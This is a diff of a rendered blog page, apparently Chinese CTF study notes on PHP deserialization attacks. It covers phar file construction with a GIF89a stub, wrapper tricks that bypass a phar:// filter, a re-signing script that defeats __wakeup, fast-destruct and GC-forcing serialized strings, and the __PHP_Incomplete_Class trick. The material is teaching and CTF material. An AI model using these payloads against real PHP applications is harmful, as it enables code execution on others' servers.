     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><ol>
+</h2><ol>
 <li>phar文件要能够上传到服务器端。</li>
 <li>要有可用的魔术方法作为“跳板”。</li>
 <li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li>
 </ol>
-<h6 id="文件结构" class="heading-element"><span>0.0.0.9.2  文件结构</span>
+<h2 id="文件结构" class="heading-element"><span>文件结构</span>
   <a href="#%e6%96%87%e4%bb%b6%e7%bb%93%e6%9e%84" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>phar文件是php里类似于JAR的一种打包文件本质上是一种压缩文件，在PHP 5.3 或更高版本中默认开启，一个phar文件一个分为四部分</p>
+</h2><p>phar文件是php里类似于JAR的一种打包文件本质上是一种压缩文件，在PHP 5.3 或更高版本中默认开启，一个phar文件一个分为四部分</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#a6be9d">1</span>.<span style="color:#58a1dd">a</span> <span style="color:#58a1dd">stub</span>
 </span></span><span style="display:flex;"><span>可以理解为一个标志，格式为<span style="color:#58a1dd">xxx</span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span> <span style="color:#58a1dd">xxx</span>; <span style="color:#58a1dd">__HALT_COMPILER</span>();<span style="color:#ff636f">?&gt;</span>，前面内容不限，但必须以<span style="color:#58a1dd">__HALT_COMPILER</span>();来结尾，否则<span style="color:#58a1dd">phar扩展将无法识别这个文件为phar文件</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6be9d">2</span>.<span style="color:#58a1dd">a</span> <span style="color:#58a1dd">manifest</span> <span style="color:#58a1dd">describing</span> <span style="color:#58a1dd">the</span> <span style="color:#58a1dd">contents</span>
@@ -826,11 +854,11 @@ echo serialize($test);
 </span></span><span style="display:flex;"><span><span style="color:#a6be9d">3</span>.<span style="color:#58a1dd">the</span> <span style="color:#58a1dd">file</span> <span style="color:#58a1dd">contents</span>
 </span></span><span style="display:flex;"><span>被压缩文件的内容
 </span></span><span style="display:flex;"><span><span style="color:#a6be9d">4</span>.[<span style="color:#58a1dd">optional</span>] <span style="color:#58a1dd">a</span> <span style="color:#58a1dd">signature</span> <span style="color:#ff636f">for</span> <span style="color:#58a1dd">verifying</span> <span style="color:#58a1dd">Phar</span> <span style="color:#58a1dd">integrity</span> (<span style="color:#58a1dd">phar</span> <span style="color:#58a1dd">file</span> <span style="color:#58a1dd">format</span> <span style="color:#ff636f">only</span>)
-</span></span><span style="display:flex;"><span>签名，放在文件末尾</span></span></code></pre></div><h6 id="生成phar" class="heading-element"><span>0.0.0.9.3  生成phar</span>
+</span></span><span style="display:flex;"><span>签名，放在文件末尾</span></span></code></pre></div><h2 id="生成phar" class="heading-element"><span>生成phar</span>
   <a href="#%e7%94%9f%e6%88%90phar" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>需要提前配置php.ini</p>
+</h2><p>需要提前配置php.ini</p>
 <blockquote>
 <p><strong>要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</strong></p>
 </blockquote>
@@ -849,12 +877,15 @@ echo serialize($test);
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    <span style="color:#828b96;font-style:italic">//签名自动计算
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    <span style="color:#58a1dd">$phar</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">stopBuffering</span>();
 </span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
-</span></span></code></pre></div><h6 id="利用" class="heading-element"><span>0.0.0.9.4  利用</span>
+</span></span></code></pre></div><h2 id="利用" class="heading-element"><span>利用</span>
   <a href="#%e5%88%a9%e7%94%a8" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>####### 触发phar的函数</p>
-<p><a href="https://blog.zsxsoft.com/post/38"target="_blank" rel="external nofollow noopener noreferrer">https://blog.zsxsoft.com/post/38</a></p>
+</h2><h3 id="触发phar的函数" class="heading-element"><span>触发phar的函数</span>
+  <a href="#%e8%a7%a6%e5%8f%91phar%e7%9a%84%e5%87%bd%e6%95%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><a href="https://blog.zsxsoft.com/post/38"target="_blank" rel="external nofollow noopener noreferrer">https://blog.zsxsoft.com/post/38</a></p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">fopen</span>()
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">unlink</span>()
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">stat</span>()
@@ -900,16 +931,19 @@ echo serialize($test);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">这些还不是全部</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">https</span><span style="color:#ff636f">://</span><span style="color:#58a1dd">blog</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">zsxsoft</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">com</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">post</span><span style="color:#ff636f">/</span><span style="color:#a6be9d">38</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">https</span><span style="color:#ff636f">://</span><span style="color:#58a1dd">threezh1</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">com</span><span style="color:#ff636f">/</span><span style="color:#a6be9d">2019</span><span style="color:#ff636f">/</span><span style="color:#a6be9d">09</span><span style="color:#ff636f">/</span><span style="color:#a6be9d">09</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">phar</span><span style="color:#ff636f">%</span><span style="color:#58a1dd">E5</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">8</span><span style="color:#58a1dd">F</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">8</span><span style="color:#58a1dd">D</span><span style="color:#ff636f">%</span><span style="color:#58a1dd">E5</span><span style="color:#ff636f">%</span><span style="color:#58a1dd">BA</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">8</span><span style="color:#58a1dd">F</span><span style="color:#ff636f">%</span><span style="color:#58a1dd">E5</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">88</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">97</span><span style="color:#ff636f">%</span><span style="color:#58a1dd">E5</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">8</span><span style="color:#58a1dd">C</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">96</span><span style="color:#ff636f">/</span></span></span></code></pre></div><p>####### 用法</p>
-<ul>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">https</span><span style="color:#ff636f">://</span><span style="color:#58a1dd">threezh1</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">com</span><span style="color:#ff636f">/</span><span style="color:#a6be9d">2019</span><span style="color:#ff636f">/</span><span style="color:#a6be9d">09</span><span style="color:#ff636f">/</span><span style="color:#a6be9d">09</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">phar</span><span style="color:#ff636f">%</span><span style="color:#58a1dd">E5</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">8</span><span style="color:#58a1dd">F</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">8</span><span style="color:#58a1dd">D</span><span style="color:#ff636f">%</span><span style="color:#58a1dd">E5</span><span style="color:#ff636f">%</span><span style="color:#58a1dd">BA</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">8</span><span style="color:#58a1dd">F</span><span style="color:#ff636f">%</span><span style="color:#58a1dd">E5</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">88</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">97</span><span style="color:#ff636f">%</span><span style="color:#58a1dd">E5</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">8</span><span style="color:#58a1dd">C</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">96</span><span style="color:#ff636f">/</span></span></span></code></pre></div><h3 id="用法" class="heading-element"><span>用法</span>
+  <a href="#%e7%94%a8%e6%b3%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><ul>
 <li>上传phar文件的时候可以把后缀改成gif之类</li>
 <li>调用我们上传的phar文件的功能点文件前面加上phar://</li>
 </ul>
-<h6 id="bypass" class="heading-element"><span>0.0.0.9.5  bypass</span>
+<h2 id="bypass" class="heading-element"><span>bypass</span>
   <a href="#bypass" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>（1）phar://被过滤
+</h2><p>（1）phar://被过滤
 有以下几种方法可以绕过：</p>
 <ul>
 <li>compress.bzip2://phar://</li>
@@ -925,11 +959,11 @@ php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">$phar</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">setStub</span>(<span style="color:#a6be9d">&#34;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#34;</span>); <span style="color:#828b96;font-style:italic">//设置stub
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$phar</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">setMetadata</span>(<span style="color:#58a1dd">$user</span>); <span style="color:#828b96;font-style:italic">//将对象user写入到metadata中
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$phar</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">addFromString</span>(<span style="color:#a6be9d">&#34;shell.txt&#34;</span>,<span style="color:#a6be9d">&#34;haha&#34;</span>); <span style="color:#828b96;font-style:italic">//添加压缩文件，文件名字为shell.txt,内容为haha
-</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$phar</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">stopBuffering</span>();</span></span></code></pre></div><h6 id="010" class="heading-element"><span>0.0.0.9.6  010</span>
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$phar</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">stopBuffering</span>();</span></span></code></pre></div><h2 id="010" class="heading-element"><span>010</span>
   <a href="#010" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>有时phar文件需要修改数据，可以用010修改，比如这里修改对象数量绕过wakeup</p>
+</h2><p>有时phar文件需要修改数据，可以用010修改，比如这里修改对象数量绕过wakeup</p>
 <ul>
 <li>原本是序列化对象属性个数是3，这里改成4</li>
 <li>
@@ -945,15 +979,15 @@ php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">h</span>)
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">newf</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">s</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">sha1</span>(<span style="color:#58a1dd">s</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">digest</span>()<span style="color:#ff636f">+</span><span style="color:#58a1dd">h</span> <span style="color:#828b96;font-style:italic"># 数据 + 签名 + 类型 + GBMB</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">open</span>(<span style="color:#a6be9d">&#39;datou.gif&#39;</span>, <span style="color:#a6be9d">&#39;wb&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">write</span>(<span style="color:#58a1dd">newf</span>) <span style="color:#828b96;font-style:italic"># 写入新文件</span></span></span></code></pre></div><p>用上方脚本计算完成后，在当前目录会生成datou.gif文件</p>
-<h5 id="提前destruct" class="heading-element"><span>0.0.0.10  提前destruct</span>
+<h1 id="提前destruct" class="heading-element"><span>提前destruct</span>
   <a href="#%e6%8f%90%e5%89%8ddestruct" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="垃圾回收gc" class="heading-element"><span>0.0.0.10.1  垃圾回收GC</span>
+</h1><h2 id="垃圾回收gc" class="heading-element"><span>垃圾回收GC</span>
   <a href="#%e5%9e%83%e5%9c%be%e5%9b%9e%e6%94%b6gc" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>__destruct（析构函数）当某个对象成为垃圾或者当对象被显式销毁时执行</p>
+</h2><p>__destruct（析构函数）当某个对象成为垃圾或者当对象被显式销毁时执行</p>
 <p>显式销毁，当对象没有被引用时就会被销毁,所以我们可以unset或为其赋值NULL
 隐式销毁，PHP是脚本语言,在代码执行完最后一行时,所有申请的内存都要释放掉</p>
 <p>这里在CTF中的应用就是比如throw new Exception会中断destruct，需要强制进行垃圾回收触发__destruct</p>
@@ -1000,11 +1034,11 @@ php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">$a</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">serialize</span>(<span style="color:#58a1dd">$c</span>);
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#58a1dd">urlencode</span>(<span style="color:#58a1dd">$a</span>);</span></span></code></pre></div><p>一样的原理，也是通过添加第一个索引达到触发GC的效果。</p>
 <p>造成该漏洞的主要原因是ArrayObject缺少垃圾回收函数。该漏洞称为“双递减漏洞”，漏洞报告如下（CVE-2016-5771）： <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5771"target="_blank" rel="external nofollow noopener noreferrer">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5771</a></p>
-<h6 id="fast-destruct-1" class="heading-element"><span>0.0.0.10.2  fast-destruct</span>
+<h2 id="fast-destruct-1" class="heading-element"><span>fast-destruct</span>
   <a href="#fast-destruct-1" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>1、如果单独执行<code>unserialize</code>函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。</p>
+</h2><p>1、如果单独执行<code>unserialize</code>函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。</p>
 <p>2、如果反序列化函数序列化出来的对象被赋给了程序中的变量，那么被反序列化的对象其生命周期就会变长，由于它一直都存在于这个变量当中，当这个对象被销毁，才会执行其析构函数。</p>
 <ul>
 <li>一种方式就是修改序列化字符串的结构，使得完成部分反序列化的unserialize强制退出，提前触发<code>__destruct</code></li>
@@ -1015,11 +1049,11 @@ $result = serialize($arry);echo $result.&#34;&lt;br&gt;&#34;;
 //a:2:{i:0;O:1:&#34;a&#34;:1:{s:1:&#34;a&#34;;s:3:&#34;123&#34;;}i:1;s:4:&#34;1234&#34;;}   这是正常的
 //a:2:{i:0;O:1:&#34;a&#34;:1:{s:1:&#34;a&#34;;s:3:&#34;123&#34;;}i:0;s:4:&#34;1234&#34;;}   #修改序列化数字元素个数
 //a:2:{i:0;O:1:&#34;a&#34;:1:{s:1:&#34;a&#34;;s:3:&#34;123&#34;;}i:1;s:4:&#34;1234&#34;;    #去掉序列化尾部 }</code></pre><p>本质上，fast destruct 是因为unserialize过程中扫描器发现序列化字符串格式有误导致的提前异常退出，为了销毁之前建立的对象内存空间，会立刻调用对象的<code>__destruct()</code>,提前触发反序列化链条。</p>
-<h5 id="不存在的类" class="heading-element"><span>0.0.0.11  不存在的类</span>
+<h1 id="不存在的类" class="heading-element"><span>不存在的类</span>
   <a href="#%e4%b8%8d%e5%ad%98%e5%9c%a8%e7%9a%84%e7%b1%bb" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><blockquote>
+</h1><blockquote>
 <p>漏洞点在于==序列化==的时候__PHP_Incomplete_Class_Name如果为空，即找不到绑定的类，那么__PHP_Incomplete_Class类中的属性也会被丢弃</p>
 </blockquote>
 <p>正常来说一个合法的反序列化字符串，在二次序列化也即反序列化再序列化之后所得到的结果是一致的。</p>
@@ -1049,8 +1083,11 @@ $result = serialize($arry);echo $result.&#34;&lt;br&gt;&#34;;
 <p>执行结果如下图</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305251604063.webp" alt="image-20230525160458811" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305251604063.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305251604063.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305251604063.webp?size=large 2x" data-title="image-20230525160458811" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>可以看到在二次序列化后，由于<code>O:22:&quot;__PHP_Incomplete_Class&quot;:1:{s:1:&quot;a&quot;;O:7:&quot;classes&quot;:0:{}}</code>中<code>__PHP_Incomplete_Class_Name</code>为空，找不到应该绑定的类，其属性就被丢弃了，导致了<code>serialize(unserialize($x)) != $x</code>的出现。</p>
-<p>####### 以强网杯2021 WhereIsUWebShell 为例</p>
-<p>事实上，在2021强网杯中就有利用到这一点。</p>
+<h3 id="以强网杯2021-whereisuwebshell-为例" class="heading-element"><span>以强网杯2021 WhereIsUWebShell 为例</span>
+  <a href="#%e4%bb%a5%e5%bc%ba%e7%bd%91%e6%9d%af2021-whereisuwebshell-%e4%b8%ba%e4%be%8b" class="heading-mark">
